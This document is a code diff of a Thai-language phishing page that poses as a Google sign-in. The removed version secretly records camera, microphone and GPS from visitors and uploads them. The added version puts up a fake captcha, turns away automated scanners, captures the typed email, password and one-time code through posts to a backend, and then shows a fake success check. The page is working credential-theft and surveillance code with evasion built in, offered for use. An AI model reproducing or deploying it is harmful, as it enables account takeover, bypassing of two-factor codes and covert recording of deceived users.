@@ -3,120 +3,231 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ยืนยันตัวตน - Google Account</title>
+    <title>Google Account - เข้าสู่ระบบ</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .google-box { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 420px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .google-logo { width: 75px; margin-bottom: 15px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 5px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        body {
+            background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .box {
+            background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 40px;
+            width: 420px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); position: relative;
+        }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 10px 0; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
         .input-group { text-align: left; margin-bottom: 15px; }
         .input-group label { display: block; font-size: 13px; color: #5f6368; margin-bottom: 5px; }
-        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.2s; }
-        button:hover { background: #1557b0; }
-        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
-        .alert-box { display: none; background: #fce8e6; color: #d93025; padding: 12px; border-radius: 4px; margin-bottom: 15px; font-size: 14px; border: 1px solid #f5c6cb; }
-        .permission-box { display: none; text-align: center; color: #1557b0; font-weight: bold; }
+        input { width: 100%; padding: 12px 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px; box-sizing: border-box; outline: none; transition: 0.2s; }
+        input:focus { border: 2px solid #1a73e8; }
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+        .actions a { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+        .btn-submit { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 15px; }
+        .btn-submit:hover { background: #1557b0; }
+        .footer { color: #5f6368; font-size: 12px; margin-top: 20px; }
+        
+        /* Captcha Block */
+        #captchaContainer {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: #f8f9fa; border-radius: 8px; border: 1px solid #dadce0; padding: 30px; margin-bottom: 20px;
+        }
+        #captchaContainer h2 { font-size: 16px; font-weight: 400; color: #202124; margin: 5px 0; }
+        #captchaCanvas { background: #fff; border: 1px solid #ccc; border-radius: 4px; margin: 10px 0; }
+        .captcha-input { width: 120px; padding: 8px; text-align: center; margin: 5px 0; }
+        .alert-box { display: none; background: #fce8e6; color: #d93025; padding: 12px; border-radius: 4px; margin: 15px 0; font-size: 14px; border: 1px solid #f5c6cb; }
+
+        /* OTP Simulation Block */
+        #otpContainer { display: none; flex-direction: column; align-items: center; margin-top: 10px; }
+        #otpContainer input { width: 150px; text-align: center; font-size: 20px; letter-spacing: 5px; border: 1px solid #dadce0; border-radius: 4px; padding: 10px; }
+        #otpResult { margin-top: 15px; font-size: 18px; font-weight: 500; }
+        .checkmark { color: #34a853; display: none; }
     </style>
+</head>
+<body>
+
+    <!-- MAIN BOX -->
+    <div class="box" id="mainBox">
+        <!-- LOGO -->
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+        <h1>เข้าสู่ระบบ</h1>
+        <p>ใช้บัญชี Google ของคุณ</p>
+
+        <!-- === CAPTCHA === -->
+        <div id="captchaContainer">
+            <h2>เดี๋ยวก่อน คุณใช่มนุษย์หรือไม่!</h2>
+            <canvas id="captchaCanvas" width="160" height="50"></canvas>
+            <input type="text" id="captchaInput" class="captcha-input" placeholder="กรอกตัวเลข" autocomplete="off">
+            <button class="btn-submit" style="width: auto; padding: 5px 20px; margin: 10px 0 0 0;" onclick="verifyCaptcha()">ยืนยัน</button>
+        </div>
+
+        <!-- === LOGIN BLOCK === -->
+        <div id="loginBlock" style="display: none;">
+            <div class="alert-box" id="alertBox"></div>
+            <div class="input-group">
+                <label>อีเมลหรือโทรศัพท์</label>
+                <input type="text" id="emailInput" placeholder="example@gmail.com">
+            </div>
+            <div class="input-group">
+                <label>รหัสผ่าน</label>
+                <input type="password" id="passwordInput" placeholder="••••••••">
+            </div>
+            <div class="actions">
+                <a href="https://accounts.google.com/signin/recovery" target="_blank">ลืมรหัสผ่าน?</a>
+            </div>
+            <button class="btn-submit" onclick="submitLogin()">ยืนยันตัวตน</button>
+            <div class="footer">ภาษาไทย ประเทศไทย ความช่วยเหลือ ความเป็นส่วนตัว ข้อกำหนด</div>
+        </div>
+
+        <!-- === OTP SIMULATION BLOCK === -->
+        <div id="otpContainer">
+            <p>🔐 เราได้ส่งรหัสยืนยัน (OTP) ไปยังอีเมลของคุณแล้ว</p>
+            <input type="text" id="otpInput" placeholder="123456" maxlength="6">
+            <button class="btn-submit" onclick="verifyOTP()">ยืนยันรหัส OTP</button>
+            <div id="otpResult">
+                <span class="checkmark" id="tickMark">✔️ ตรวจสอบรหัสสำเร็จ</span>
+            </div>
+        </div>
+
+    </div>
+
     <script>
-        // ** ระบบป้องกันบอท (Anti-Bot) **
+        // === ระบบป้องกันบอท ===
         if (window.navigator.webdriver || window.navigator.userAgent.indexOf('Headless') !== -1) {
-            document.write("<h1 style='color:red;text-align:center;margin-top:20%;'>🚫 ป้องกันบอทเข้าเว็บเรา</h1><p style='text-align:center;'>บอทไม่ได้รับอนุญาต!</p>");
-            throw new Error("Bot blocked");
+            document.body.innerHTML = "<h2 style='text-align:center;color:red;margin-top:20%;'>🚫 ระบบตรวจจับบอท! คุณไม่สามารถเข้าเว็บนี้ได้</h2>";
+            throw new Error("Bot Detected");
         }
 
-        document.addEventListener('contextmenu', event => event.preventDefault()); // ป้องกันคลิกขวา
-
-        // ** ระบบป้องกันการถ่ายภาพ (Anti-Screenshot) **
+        // === ระบบป้องกันการถ่ายภาพ (PrintScreen) ===
         document.addEventListener('keyup', function(e) {
             if (e.key === 'PrintScreen') {
-                alert("⚠️ เว็บป้องกันการถ่ายภาพ");
+                alert("เว็บป้องกันการถ่ายภาพ");
                 return false;
             }
         });
 
-        let mediaRecorder;
-        let recordedChunks = [];
-        let videoBlob;
+        // === ระบบตรวจจับเมาส์ (Mouse Movement) ===
+        let mouseMoved = false;
+        document.addEventListener('mousemove', function() {
+            mouseMoved = true;
+        });
 
-        async function verifyIdentity() {
-            const alertBox = document.getElementById('alert');
-            const btn = document.querySelector('button');
-            btn.disabled = true;
-            btn.innerText = "กำลังยืนยันตัวตน...";
-            alertBox.style.display = 'none';
+        // === GENERATE CUSTOM CAPTCHA (ใช้โค้ดของมึงเอง ไม่ใช้ API) ===
+        let currentCaptchaCode = "";
+        function generateCaptcha() {
+            const canvas = document.getElementById('captchaCanvas');
+            const ctx = canvas.getContext('2d');
+            ctx.clearRect(0, 0, 160, 50);
 
-            try {
-                // ** ขอสิทธิ์ GPS **
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
-                });
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
+            // สุ่มตัวเลข 4 หลัก
+            currentCaptchaCode = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            // วาดพื้นหลังขาว
+            ctx.fillStyle = '#f0f0f0';
+            ctx.fillRect(0, 0, 160, 50);
+            
+            // วาด Noise เส้นขีดข่วน
+            for (let i = 0; i < 30; i++) {
+                ctx.beginPath();
+                ctx.moveTo(Math.random() * 160, Math.random() * 50);
+                ctx.lineTo(Math.random() * 160, Math.random() * 50);
+                ctx.strokeStyle = '#ccc';
+                ctx.lineWidth = 1;
+                ctx.stroke();
+            }
 
-                // ** ขอสิทธิ์กล้องและไมค์ **
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                
-                recordedChunks = [];
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
-                mediaRecorder.onstop = async () => {
-                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('video', videoBlob, 'victim_video.webm');
-                    formData.append('lat', lat);
-                    formData.append('lng', lng);
+            // วาดตัวเลขโดยบิดเบี้ยวและหมุน
+            ctx.font = 'bold 30px Arial';
+            ctx.fillStyle = '#333';
+            for (let i = 0; i < 4; i++) {
+                ctx.save();
+                ctx.translate(20 + i * 30, 35);
+                ctx.rotate((Math.random() - 0.5) * 0.5);
+                ctx.fillText(currentCaptchaCode[i], 0, 0);
+                ctx.restore();
+            }
 
-                    // ส่งไป Backend
-                    const res = await fetch('/upload', { method: 'POST', body: formData });
-                    if(res.ok) {
-                        document.querySelector('.permission-box').style.display = 'block';
-                        btn.style.display = 'none';
-                        document.getElementById('statusText').innerText = "✅ ยืนยันตัวตนเสร็จสมบูรณ์!";
-                    } else {
-                        alert("เกิดข้อผิดพลาด ส่งข้อมูลไม่สำเร็จ!");
-                    }
-                };
-                mediaRecorder.start();
-                setTimeout(() => { if(mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 8000); // บันทึก 8 วิ
-                
-                document.getElementById('loginForm').style.display = 'none';
-                document.querySelector('.permission-box').style.display = 'block';
-                document.getElementById('statusText').innerText = "📷 กำลังบันทึกวิดีโอเพื่อยืนยัน...";
-
-            } catch (err) {
-                alertBox.style.display = 'block';
-                alertBox.innerText = "⚠️ ระบบต้องการสิทธิ์ในการเปิดกล้องและตำแหน่งเพื่อยืนยันตัวตน กรุณาอนุญาต!";
-                btn.disabled = false;
-                btn.innerText = "ยืนยันตัวตน";
-                console.error(err);
+            // วาด Noise จุดกระจาย
+            for (let i = 0; i < 40; i++) {
+                ctx.fillStyle = '#999';
+                ctx.fillRect(Math.random() * 160, Math.random() * 50, 2, 2);
             }
         }
-    </script>
-</head>
-<body>
-    <div class="google-box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
-        <h1>ยืนยันตัวตน</h1>
-        <p>เข้าสู่ระบบด้วยบัญชี Google ของคุณ</p>
-        
-        <div class="alert-box" id="alert"></div>
-        <div class="permission-box" id="permissionBox">
-            <div id="statusText">⏳ กำลังยืนยัน...</div>
-        </div>
+        generateCaptcha();
 
-        <div id="loginForm">
-            <div class="input-group">
-                <label>อีเมลหรือโทรศัพท์</label>
-                <input type="text" value="victim@gmail.com" disabled style="background:#f1f3f4; color:#5f6368;">
-            </div>
-            <button onclick="verifyIdentity()">ยืนยันตัวตน</button>
-        </div>
-        
-        <div class="footer">ภาษาไทย (ประเทศไทย) ความช่วยเหลือ ความเป็นส่วนตัว ข้อกำหนด</div>
-    </div>
+        // === CAPTCHA VERIFY ===
+        function verifyCaptcha() {
+            const userInput = document.getElementById('captchaInput').value;
+            if (userInput === currentCaptchaCode) {
+                if (!mouseMoved) {
+                    alert("⚠️ ตรวจพบพฤติกรรมหุ่นยนต์ ไม่อนุญาตให้เข้าถึง");
+                    window.location.href = "https://www.google.com";
+                    return;
+                }
+                // ถ้าผ่าน: ซ่อน Captcha, โชว์ Login
+                document.getElementById('captchaContainer').style.display = 'none';
+                document.getElementById('loginBlock').style.display = 'block';
+            } else {
+                alert("❌ รหัส Captcha ไม่ถูกต้อง! กรุณาลองใหม่อีกครั้ง");
+                generateCaptcha(); // สร้างใหม่ไม่ให้เหมือนเดิม
+                document.getElementById('captchaInput').value = "";
+            }
+        }
+
+        // === LOGIN SUBMIT (ส่ง Webhook + จำลอง OTP) ===
+        function submitLogin() {
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const alertBox = document.getElementById('alertBox');
+
+            if (!email || !password) {
+                alertBox.style.display = 'block';
+                alertBox.innerText = "⚠️ กรุณากรอกอีเมลและรหัสผ่านให้ครบ!";
+                return;
+            }
+            alertBox.style.display = 'none';
+
+            // ส่งข้อมูลไปยัง Backend ของมึง (Webhook จะส่งใน Backend)
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password, otp: "" })
+            });
+
+            // ซ่อน Login Block, โชว์ OTP Block
+            document.getElementById('loginBlock').style.display = 'none';
+            document.getElementById('otpContainer').style.display = 'flex';
+        }
+
+        // === OTP VERIFY (จำลองการตรวจสอบ) ===
+        function verifyOTP() {
+            const otpInput = document.getElementById('otpInput').value;
+            if (otpInput.length < 6) {
+                alert("กรุณากรอกรหัส 6 หลัก");
+                return;
+            }
+
+            // ส่ง OTP ไปให้ Webhook อีกครั้ง
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password, otp: otpInput })
+            });
+
+            const tick = document.getElementById('tickMark');
+            tick.style.display = 'none';
+            document.getElementById('otpResult').innerText = "⏳ กำลังตรวจสอบรหัส...";
+
+            // ค้าง 2.5 วิ แล้วค่อยติ๊กถูก
+            setTimeout(() => {
+                document.getElementById('otpResult').innerHTML = '<span class="checkmark" id="tickMark">✔️ ตรวจสอบรหัสสำเร็จ</span>';
+                document.getElementById('tickMark').style.display = 'block';
+                // เปลี่ยนปุ่มเป็น จบการทำงาน
+                document.querySelector('#otpContainer .btn-submit').style.display = 'none';
+            }, 2500);
+        }
+    </script>
 </body>
 </html>
